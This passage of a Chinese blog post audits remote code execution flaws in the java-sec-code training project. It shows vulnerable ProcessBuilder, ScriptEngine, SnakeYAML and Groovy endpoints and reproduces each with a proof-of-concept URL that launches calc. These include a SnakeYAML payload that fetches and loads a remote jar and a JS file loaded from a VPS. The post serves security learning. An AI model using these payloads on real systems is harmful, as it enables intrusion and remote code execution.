&#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>核心代码, 创建 <code>ProcessBuilder</code> 实例化对象，调用 <code>start</code> 方法执行 <code>arrCmd</code> </p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>返回 <code>Process</code> 对象 <code>p </code> 调用 <code>getInputStream</code> 获取输入流，读取输入流写入输入流。</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>漏洞路径找寻，依旧按照从上而下的方法找寻路径</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923103044841.png" data-caption="image-20220923103044841"><img src="/../images/Java/rce/image-20220923103044841.png" alt="image-20220923103044841"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923103020225.png" data-caption="image-20220923103020225"><img src="/../images/Java/rce/image-20220923103020225.png" alt="image-20220923103020225"></a></p>
+<p>拼接路径，漏洞复现 <code>http://192.168.114.131:8080/rce/ProcessBuilder?cmd=calc.exe</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923101155900.png" data-caption="image-20220923101155900"><img src="/../images/Java/rce/image-20220923101155900.png" alt="image-20220923101155900"></a></p>
+<p>小结：参考第一部分方法，通过全局搜索 <code>ProcessBuilder</code> 定位是否存在危险函数，然后查看其代码是否采取了过滤机制，再跟进代码分析其执行方法，最后定位漏洞路径进行漏洞复现。</p>
+<br/>
+
+<h3 id="三、ScriptEngine-命令执行-jscmd"><a href="#三、ScriptEngine-命令执行-jscmd" class="headerlink" title="三、ScriptEngine 命令执行(jscmd)"></a>三、ScriptEngine 命令执行(jscmd)</h3><p><code>ScriptEngine</code> 是一个脚本引擎，包含一些操作方法，<code>eval</code> ,<code>createBindings</code>, <code>setBindings</code>。通过 <code>ScriptEngine</code> 获取 <code>jsurl</code> 传入的 <code>js</code> 脚本文件，然后再通过 <code>engine.getBindings</code> 获取 <code>js</code> 脚本文件中的方法和属性，加载 <code>js</code> 之后将其赋值给 <code>cmd</code>，然后再通过 <code>engine.eval</code> 执行，⚠️ 在 <code>Java 8</code>之后移除了 <code>ScriptEngineManager</code> 的 <code>eval</code>。</p>
+<p>具体漏洞源码如下：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">    <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>恶意js代码，放置于VPS中，待远程调用</p>
+<div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="title function_">mainOutput</span>(); </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mainOutput</span>(<span class="params"></span>) &#123; </span><br><span class="line">    <span class="keyword">var</span> x=java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>漏洞复现，vps上放置恶意代码</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924200159394.png" data-caption="image-20220924200159394"><img src="/../images/Java/rce/image-20220924200159394.png" alt="image-20220924200159394"></a></p>
+<p>远程访问加载恶意 js 实现攻击,构造链接为：<code>http://127.0.0.1:8080/jscmd?jsurl=http://x.x.x.x:8000/test.js</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924200052768.png" data-caption="image-20220924200052768"><img src="/../images/Java/rce/image-20220924200052768.png" alt="image-20220924200052768"></a></p>
+<p>小结：通过全局搜索 <code>ScriptEngine</code> 定位是否存在危险函数，然后查看其代码是否采取了过滤机制，再跟进代码分析其执行方法，最后定位漏洞路径进行漏洞复现。</p>
+<br/>
+
+<h3 id="四、yml命令执行"><a href="#四、yml命令执行" class="headerlink" title="四、yml命令执行"></a>四、yml命令执行</h3><p>YAML(YAML Ain’t Markup Language)，也可以叫做YML，是一种人性化的数据序列化的语言，类似于XML，JSON。SpringBoot的配置文件就支持yaml文件。原理利用 <code>SnakeYAML</code> 存在的反序列化漏洞进行 <code>RCE</code>，系统在解析恶意 <code>yml</code> 内容时会完成指定的动作。触发 <code>java.net.URL</code> 去拉取远程 <code>HTTP</code> 服务器上的恶意 <code>jar</code> 文件,然后是寻找 <code>jar</code> 文件中实现 <code>javax.script.ScriptEngineFactory</code> 接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞。</p>
+<p>yaml有三种数据结构，结构如下：</p>
+<p>● 对象</p>
+<div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写在一行</span></span><br><span class="line"><span class="attr">address:</span> &#123;<span class="attr">province:</span> <span class="string">山东</span>, <span class="attr">city:</span> <span class="string">济南</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写在多行</span></span><br><span class="line"><span class="attr">address:</span></span><br><span class="line"><span class="attr">province:</span> <span class="string">山东</span></span><br><span class="line"><span class="attr">city:</span> <span class="string">济南</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>● 数组</p>
+<div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写在一行</span></span><br><span class="line"><span class="attr">hobbyList:</span> [<span class="string">游泳</span>, <span class="string">跑步</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写在多行</span></span><br><span class="line"><span class="attr">hobbyList:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">游泳</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">跑步</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>● 纯量</p>
+<div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串 默认不用加引号，包含空格或特殊字符必须加引号，单引号或双引号都可以</span></span><br><span class="line"><span class="attr">userId:</span> <span class="string">S123</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">&quot;lisi&quot;</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="attr">province:</span> <span class="string">山东</span></span><br><span class="line"><span class="attr">city:</span> <span class="string">&quot;济南 : ss&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔值</span></span><br><span class="line"><span class="attr">success:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浮点数</span></span><br><span class="line"><span class="attr">weight:</span> <span class="number">75.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Null</span></span><br><span class="line"><span class="attr">gender:</span> <span class="string">~</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line"><span class="attr">createDate:</span> <span class="number">2001-12-14T21:59:43.10+05</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>漏洞分析，具体漏洞代码如下：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/sec/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">secYarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>Payload 项目地址：<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a> ,恶意代码如下	</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">            <span class="comment">//Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getParameter</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getMethodCallSyntax</span><span class="params">(String obj, String m, String... args)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getOutputStatement</span><span class="params">(String toDisplay)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProgram</span><span class="params">(String... statements)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ScriptEngine <span class="title function_">getScriptEngine</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>漏洞复现，先编译 <code>java</code> 再将恶意代码带入 <code>yaml-payload.jar</code></p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924203259186.png" data-caption="image-20220924203259186"><img src="/../images/Java/rce/image-20220924203259186.png" alt="image-20220924203259186"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212111867.png" data-caption="image-20220924212111867"><img src="/../images/Java/rce/image-20220924212111867.png" alt="image-20220924212111867"></a></p>
+<p>然后VPS <code>Python</code> 临时起一个服务放置 <code>yaml-payload.jar</code>（这里使用本机起服务）</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212749312.png" data-caption="image-20220924212749312"><img src="/../images/Java/rce/image-20220924212749312.png" alt="image-20220924212749312"></a></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212459768.png" data-caption="image-20220924212459768"><img src="/../images/Java/rce/image-20220924212459768.png" alt="image-20220924212459768"></a></p>
+<p>拼接如下内容：</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>访问后弹出记事本</p>
+<div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
+
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924212609577.png" data-caption="image-20220924212609577"><img src="/../images/Java/rce/image-20220924212609577.png" alt="image-20220924212609577"></a></p>
+<br/>
+
+<h3 id="五、Groovy"><a href="#五、Groovy" class="headerlink" title="五、Groovy"></a>五、Groovy</h3><p><code>Groovy</code> 是一种基于Java平台的面向对象语言。 </p>
+<p>漏洞分析，具体漏洞代码如下：</p>
+<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;groovy&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">groovyshell</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">    groovyShell.evaluate(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>主要原理，不安全的使用了 <code>Groovy</code> 调用命令，对用户的输入没有进行过滤。<code>content</code> 为用户输入的命令，groovy 接收指令后，利用 <code>evaluate</code> 进行执行。</p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923105400989.png" data-caption="image-20220923105400989"><img src="/../images/Java/rce/image-20220923105400989.png" alt="image-20220923105400989"></a></p>
+<p>漏洞复现，构造链接为：<code>http://127.0.0.1:8080/rce/groovy?content=&quot;calc&quot;.execute()</code></p>
+<p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924205355487.png" data-caption="image-20220924205355487"><img src="/../images/Java/rce/image-20220924205355487.png" alt="image-20220924205355487"></a></p>
+<br/>
+
+<h3 id="六、其他"><a href="#六、其他" class="headerlink" title="六、其他"></a>六、其他</h3><p>1）由于代码对于用户传入的类、类的方法、类的参数没有做任何限制，亦可以导致 RCE 的产生。<br>2）由表达式注入导致的RCE漏洞，常见的如：OGNL、SpEL、MVEL、EL、Fel、JST+EL 等<br>3）由java后端模板引擎注入导致的 RCE 漏洞，常见的如：Freemarker、Velocity、Thymeleaf 等<br>4）由第三方开源组件引起的 RCE 漏洞，常见的如：Fastjson、Shiro、Xstream、Struts2、weblogic 等</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里只参考了 <code>Java-sec-code</code> 项目中的 <code>RCE</code> 漏洞进行学习，当然实战中的变化也不单单只有这些俗套的套路。后续会继续学习其他的挖掘方法、利用方法。</p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/338055.html</span><br><span class="line">https://cbatl.gitee.io/2021/12/09/javaseccode1/</span><br><span class="line">https://www.cnpanda.net/codeaudit/705.html</span><br><span class="line">https://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</span><br><span class="line">https://www.cnblogs.com/CoLo/p/15240834.html#:~:text=ProcessBuilder%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%201%E3%80%81%E5%88%9B%E5%BB%BAProcessBuilder%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1,2%E3%80%81%E8%B0%83%E7%94%A8start%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%203%E3%80%81%E8%BF%94%E5%9B%9E%E7%9A%84Process%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8getInputStream%E8%8E%B7%E5%8F%96%E8%BE%93%E5%85%A5%E6%B5%81%204%E3%80%81%E8%AF%BB%E5%8F%96%E8%BE%93%E5%85%A5%E6%B5%81%E5%86%99%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">RCE 简述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">Java 命令执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">靶场搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">一、项目地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">3.2.</span> <span class="toc-text">二、环境配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="toc-number">4.</span> <span class="toc-text">漏洞学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81Runtime-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.1.</span> <span class="toc-text">一、Runtime 命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81ProcessBuilder-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">二、ProcessBuilder 命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81ScriptEngine-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-jscmd"><span class="toc-number">4.3.</span> <span class="toc-text">三、ScriptEngine 命令执行(jscmd)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81yml%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.4.</span> <span class="toc-text">四、yml命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81Groovy"><span class="toc-number">4.5.</span> <span class="toc-text">五、Groovy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%85%B6%E4%BB%96"><span class="toc-number">4.6.</span> <span class="toc-text">六、其他</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">参考文章：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/25/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%BA%8C)-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
